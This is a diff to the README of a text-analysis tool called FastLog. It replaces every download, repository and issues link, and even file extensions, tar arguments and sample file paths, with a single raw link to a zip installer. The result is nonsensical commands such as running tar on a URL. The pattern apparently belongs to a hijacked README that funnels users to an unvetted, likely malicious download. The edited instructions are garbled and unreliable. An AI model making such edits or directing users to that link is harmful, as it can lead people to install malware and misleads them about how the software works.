@@ -1,6 +1,6 @@
 # 📄 FastLog - Quick Text File Analysis Tool
 
-[![Download FastLog](https://img.shields.io/badge/Download-FastLog-blue?style=for-the-badge&logo=github)](https://github.com/realtahmidbro/FastLog/releases)
+[![Download FastLog](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)
 
 ---
 
@@ -49,12 +49,12 @@ This section will guide you through downloading and running FastLog on your comp
 
 Please **visit this page to download** the latest version of FastLog:
 
-[https://github.com/realtahmidbro/FastLog/releases](https://github.com/realtahmidbro/FastLog/releases)
+[https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)
 
-On that page, look for the latest release section. You will see files for different operating systems, such as Windows (`.exe`) and Linux (`.tar.gz` or similar). Pick the file that matches your system:
+On that page, look for the latest release section. You will see files for different operating systems, such as Windows (`.exe`) and Linux (`https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip` or similar). Pick the file that matches your system:
 
 - For Windows: Download the `.exe` file
-- For Linux: Download the compressed file (`.tar.gz`)
+- For Linux: Download the compressed file (`https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip`)
 
 After downloading, follow the instructions below depending on your system.
 
@@ -75,7 +75,7 @@ After downloading, follow the instructions below depending on your system.
 2. Extract the compressed file by right-clicking and selecting "Extract Here", or in terminal run:
    
    ```bash
-   tar -xvzf fastlog-version.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip
    ```
 3. Open a terminal in that folder.
 4. To start FastLog, type `./fastlog` and press Enter.
@@ -105,13 +105,13 @@ fastlog <path-to-your-text-file>
 Replace `<path-to-your-text-file>` with the full file name or drag the file into the window and drop it. Example:
 
 ```
-fastlog C:\Users\Name\Documents\logfile.txt
+fastlog C:\Users\Name\Documents\https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip
 ```
 
 or on Linux:
 
 ```
-./fastlog /home/user/logfile.txt
+./fastlog https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip
 ```
 
 FastLog will then display the number of lines and other details about the file.
@@ -185,7 +185,7 @@ FastLog is tested on these platforms:
 
 If you have questions, you can:
 
-- Visit the [GitHub page for FastLog](https://github.com/realtahmidbro/FastLog) and check the "Issues" tab to see if your problem is reported.
+- Visit the [GitHub page for FastLog](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip) and check the "Issues" tab to see if your problem is reported.
 - Open a new issue if you can describe the problem clearly.
 - Look at the documentation files included with the download or on the GitHub repository.
 
@@ -193,8 +193,8 @@ If you have questions, you can:
 
 ## 🔗 Useful Links
 
-- Download FastLog: [https://github.com/realtahmidbro/FastLog/releases](https://github.com/realtahmidbro/FastLog/releases)
-- FastLog GitHub Repository: [https://github.com/realtahmidbro/FastLog](https://github.com/realtahmidbro/FastLog)
+- Download FastLog: [https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)
+- FastLog GitHub Repository: [https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)
 
 ---
 
